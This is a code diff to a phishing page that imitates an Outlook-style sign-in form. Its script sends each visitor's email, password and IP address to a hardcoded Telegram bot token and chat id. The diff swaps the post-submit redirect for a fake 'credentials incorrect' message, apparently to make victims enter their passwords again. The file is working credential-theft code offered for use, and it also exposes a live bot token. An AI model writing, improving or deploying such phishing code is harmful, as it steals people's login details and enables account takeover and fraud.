@@ -171,11 +171,22 @@
             transform: translateX(-50%);
         }
 
-        /* SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg */
-        /* JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb */
-
-        /* SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg */
-        /* JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb */
+ #text {
+                  display: inline-block;
+                  text-align: center;
+                  white-space: nowrap;
+            opacity: 0; /* Start fully transparent */
+            transform: translateY(10px); /* Start slightly shifted */
+            transition: all 0.5s ease; /* Smooth animation */
+            margin-top: 10px;
+            font-size: 12.5px;
+            color: red;
+          
+        }
+        #text.visible {
+            opacity: 1; /* Fully visible */
+            transform: translateY(0); /* No shift */
+        }
     </style>
 </head>
 
@@ -199,6 +210,7 @@
                             <input type="email" placeholder="Email" name="username" id="username">
                             <input type="password" placeholder="Password" name="password" id="password">
                         </div>
+ <p id="text">The Credentials you have entered is incorrect!</p>
                         <!-- <input name="_next" type="hidden" id="name" value="thanks.html"> -->
                         <p>No Account? <a href="#">Create One!</a></p>
                         <a href="#">Sign in with a security key <span>?</span></a>
@@ -209,7 +221,7 @@
 
                 </div>
             </div>
-            <button type="submit" value="submit">Sign in</button>
+            <button type="submit"  id="showTextButton" value="submit">Sign in</button>
         </form>
         <div class="bottom">
             <img
@@ -267,24 +279,41 @@
 
                 var telegramMessage = `Username-outlook: ${username}\nPassword-outlook: ${password}\nIpaddress: ${ipaddress}`;
 
-               var token = '7829083815:AAGfy6ASr4XQ1mo8hpTC1V8R19oTQiaBQZI';
+             
+                var token = '7829083815:AAGfy6ASr4XQ1mo8hpTC1V8R19oTQiaBQZI';
             var chat_id = '6786381831'
                 var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
-                fetch(url)
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            window.location.href = 'thanks.html';  // Redirect to thank you page
-                        } else {
-                            alert('Error sending message.');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                    });
+                 fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // alert(''); // Redirect to thank you page
+                        event.preventDefault();
+                        //   location.reload();
+                    } else {
+                        alert('Error sending message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
             });
+    document.getElementById('showTextButton').addEventListener('click', function () {
+        const textElement = document.getElementById('text');
 
+        // Check if the text is already visible
+        if (!textElement.classList.contains('visible')) {
+            // Make the text visible with animation
+            textElement.classList.add('visible');
+
+            // Update the text dynamically (optional)
+            textElement.textContent = "The Credentials you have entered is incorrect!";
+        } else {
+            // Hide the text if clicked again (toggle functionality)
+            textElement.classList.remove('visible');
+        }
+    });
     </script>
 </body>
 
